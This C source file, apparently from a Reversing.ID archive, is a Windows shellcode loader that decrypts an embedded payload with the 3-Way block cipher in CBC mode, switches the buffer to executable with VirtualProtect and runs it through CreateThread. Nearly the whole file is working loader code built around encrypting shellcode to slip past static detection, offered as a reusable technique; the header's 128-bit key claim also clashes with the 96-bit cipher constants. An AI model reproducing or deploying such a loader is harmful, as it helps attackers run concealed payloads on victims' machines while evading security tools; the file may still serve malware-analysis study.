/*
    Shellcode Loader
    Archive of Reversing.ID

    writing shellcode to allocated memory.
    implementing 3-Way algorithm.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    3-Way algorithm
    - permission: VirtualProtect
    - execution:  CreateThread

Reference:
    - https://github.com/ReversingID/Crypto-Reference/blob/master/Codes/Cipher/Block/3-Way/code.c

Note:
    - key size: 128-bit
    - mode: CBC (Cipher Block Chaining)
    - IV is appended into the shellcode
*/

#include <windows.h>
#include <stdint.h>
#include <stdlib.h>

/* ************************* CONFIGURATION & SEED ************************* */
#define BLOCKSIZE       96
#define BLOCKSIZEB      12
#define KEYSIZE         96
#define KEYSIZEB        12
#define ROUNDS          11

#define STRT_E          0x0b0b      /* constant for first encryption round */ 
#define STRT_D          0xb1b1      /* constant for first decryption round */

#ifdef _MSC_VER
    #pragma intrinsic(_lrotr,_lrotl)
    #define rotr(x,n)   _lrotr(x,n)
    #define rotl(x,n)   _lrotl(x,n)
#else 
    #define rotr(x,n)   (((x) >> ((int)(n))) | ((x) << (32 - (int)(n))))
    #define rotl(x,n)   (((x) << ((int)(n))) | ((x) >> (32 - (int)(n))))
#endif

#define bswap32(x)      (rotl(x,8) & 0x00FF00FF | rotr(x, 8) & 0xFF00FF00)

#ifdef _MSC_VER
    #define LITTLE_ENDIAN
#elif defined(__BYTE_ORDER__) && (__BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__)
    #define LITTLE_ENDIAN 
#elif defined(__BYTE_ORDER__) && (__BYTE_ORDER__ == __ORDER_BIG_ENDIAN__)
    #define BIG_ENDIAN
#else 
    #define BIG_ENDIAN
#endif


/* ********************* INTERNAL FUNCTIONS PROTOTYPE ********************* */
void mu(uint32_t * data);
void gamma(uint32_t * data);
void theta(uint32_t * data);
void rho(uint32_t * data);

void pi_1(uint32_t * data);
void pi_2(uint32_t * data);

void rndcon_gen(uint32_t start, uint32_t *rtab);


/* *************************** HELPER FUNCTIONS *************************** */
void xor_block(uint8_t * dst, uint8_t * src1, uint8_t * src2)
{
    register uint32_t i = 0;
    for (i = 0; i < BLOCKSIZEB; i++)
        dst[i] = src1[i] ^ src2[i];
}


void block_decrypt(uint8_t * data, uint8_t * key)
{
    uint32_t i;
    uint32_t rcon[ROUNDS + 1];
    uint32_t _data[3], _key[3];

    uint32_t * p_data = (uint32_t*)data;
    uint32_t * p_key  = (uint32_t*)key;

    for (i = 0; i < 3; i++)
    {
#ifdef LITTLE_ENDIAN
        _data[i] = bswap32(p_data[i]);
        _key[i]  = bswap32(p_key[i]);
#else
        _data[i] = p_data[i];
        _key[i]  = p_key[i];
#endif 
    }

    theta(_key);
    mu(_key);
    mu(_data);

    rndcon_gen(STRT_D, rcon);
    for (i = 0; i < ROUNDS; i++)
    {
        _data[0] ^= _key[0] ^ (rcon[i] << 16);
        _data[1] ^= _key[1];
        _data[2] ^= _key[2] ^ rcon[i];
        rho(_data);
    }

    _data[0] ^= _key[0] ^ (rcon[ROUNDS] << 16);
    _data[1] ^= _key[1];
    _data[2] ^= _key[2] ^ rcon[ROUNDS];
    theta(_data);
    mu(_data);

    for (i = 0; i < 3; i++)
#ifdef LITTLE_ENDIAN
        p_data[i] = bswap32(_data[i]);
#else
        p_data[i] = _data[i];
#endif
}

// 3-Way decryption with CBC
void decrypt(uint8_t * data, uint32_t length, uint8_t * key, uint8_t * iv)
{
    uint32_t   i;
    uint8_t    prev_block[BLOCKSIZEB];
    uint8_t    ctext_block[BLOCKSIZEB];
    
    memcpy(prev_block, iv, BLOCKSIZEB);

    for (i = 0; i < length; i += BLOCKSIZEB)
    {
        // Simpan block ciphertext untuk operasi XOR berikutnya.
        memcpy(ctext_block, &data[i], BLOCKSIZEB);

        // Dekripsi ciphertext menjadi block
        block_decrypt(&data[i], key);

        // XOR block block dengan block ciphertext sebelumnya
        // gunakan IV bila ini adalah block pertama
        xor_block(&data[i], &data[i], prev_block);

        // Pindahkan block ciphertext yang telah disimpan
        memcpy(prev_block, ctext_block, BLOCKSIZEB);
    }
}


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    // IV is embedded within, so we need to mark both payload and IV
    uint8_t     payload []  = { 
        0x09, 0xfa, 0x0e, 0x4a, 0x6b, 0xd1, 0xec, 0x5d, 0x6e, 0xa2, 0xac, 0xef, 0x73, 0xaf, 0x36, 0xa8,
        0x1c, 0xbd, 0x1c, 0x56, 0x76, 0x7a, 0x2b, 0xc5, 0xfd, 0x2c, 0x8d, 0x58, 0xcc, 0xc4, 0x37, 0xfb,
        0x83, 0x2a, 0x7b, 0x1e 
    };
    uint32_t    payload_len = 24;
    uint8_t*    iv = &payload[payload_len];

    // secret-key 16-bytes or 128-bit
    uint8_t     key[] = 
            { 0x52, 0x45, 0x56, 0x45, 0x52, 0x53, 0x49, 0x4E, 0x47, 0x2E, 0x49, 0x44, 
    /* ASCII:   R     E     V     E     R     S     I     N     G     .     I     D  */
              0x31, 0x33, 0x33, 0x37 };
            /*  1     3     3     7  */

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // decrypt data
    RtlMoveMemory (runtime, payload, payload_len);
    decrypt ((uint8_t*)runtime, payload_len, key, iv);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}


/* ********************* INTERNAL FUNCTIONS IMPLEMENTATION ********************* */
void mu(uint32_t * data)
{
    uint32_t i, temp[3];

	temp[0] = temp[1] = temp[2] = 0;
	for (i = 0; i < 32; i++) {
		temp[0] <<= 1;
		temp[1] <<= 1;
		temp[2] <<= 1;

		if (data[0] & 1)
			temp[2] |= 1;
		if (data[1] & 1)
			temp[1] |= 1;
		if (data[2] & 1)
			temp[0] |= 1;

		data[0] >>= 1;
		data[1] >>= 1;
		data[2] >>= 1;
	}

	data[0] = temp[0];
	data[1] = temp[1];
	data[2] = temp[2];
}

void gamma(uint32_t * data)
{
    uint32_t temp[3];

    temp[0] = data[0] ^ (data[1] | (~data[2]));
    temp[1] = data[1] ^ (data[2] | (~data[0]));
    temp[2] = data[2] ^ (data[0] | (~data[1]));

    data[0] = temp[0];
    data[1] = temp[1];
    data[2] = temp[2];
}

void theta(uint32_t * data)
{
    uint32_t temp[3];

    temp[0] =
	     data[0] ^ 
        (data[0] >> 16) ^ (data[1] << 16) ^ (data[1] >> 16) ^ (data[2] << 16) ^
	    (data[1] >> 24) ^ (data[2] <<  8) ^ (data[2] >>  8) ^ (data[0] << 24) ^ 
        (data[2] >> 16) ^ (data[0] << 16) ^ (data[2] >> 24) ^ (data[0] << 8);
	temp[1] =
	     data[1] ^ 
        (data[1] >> 16) ^ (data[2] << 16) ^ (data[2] >> 16) ^ (data[0] << 16) ^
	    (data[2] >> 24) ^ (data[0] <<  8) ^ (data[0] >>  8) ^ (data[1] << 24) ^ 
        (data[0] >> 16) ^ (data[1] << 16) ^ (data[0] >> 24) ^ (data[1] << 8);
	temp[2] =
	     data[2] ^ 
        (data[2] >> 16) ^ (data[0] << 16) ^ (data[0] >> 16) ^ (data[1] << 16) ^
	    (data[0] >> 24) ^ (data[1] <<  8) ^ (data[1] >>  8) ^ (data[2] << 24) ^ 
        (data[1] >> 16) ^ (data[2] << 16) ^ (data[1] >> 24) ^ (data[2] << 8);

	data[0] = temp[0];
	data[1] = temp[1];
	data[2] = temp[2];
}

void rho(uint32_t * data)
{
    theta(data);
	pi_1(data);
	gamma(data);
	pi_2(data);
}

void pi_1(uint32_t * data)
{
    data[0] = (data[0] >> 10) ^ (data[0] << 22);
	data[2] = (data[2] <<  1) ^ (data[2] >> 31);
}

void pi_2(uint32_t * data)
{
    data[0] = (data[0] <<  1) ^ (data[0] >> 31);
	data[2] = (data[2] >> 10) ^ (data[2] << 22);
}

void rndcon_gen(uint32_t start, uint32_t *rtab)
{
    uint32_t i;

    for (i = 0; i <= ROUNDS; i++)
    {
        rtab[i] = start;
        start <<= 1;
        if (start & 0x10000)
            start ^= 0x11011;
    }
}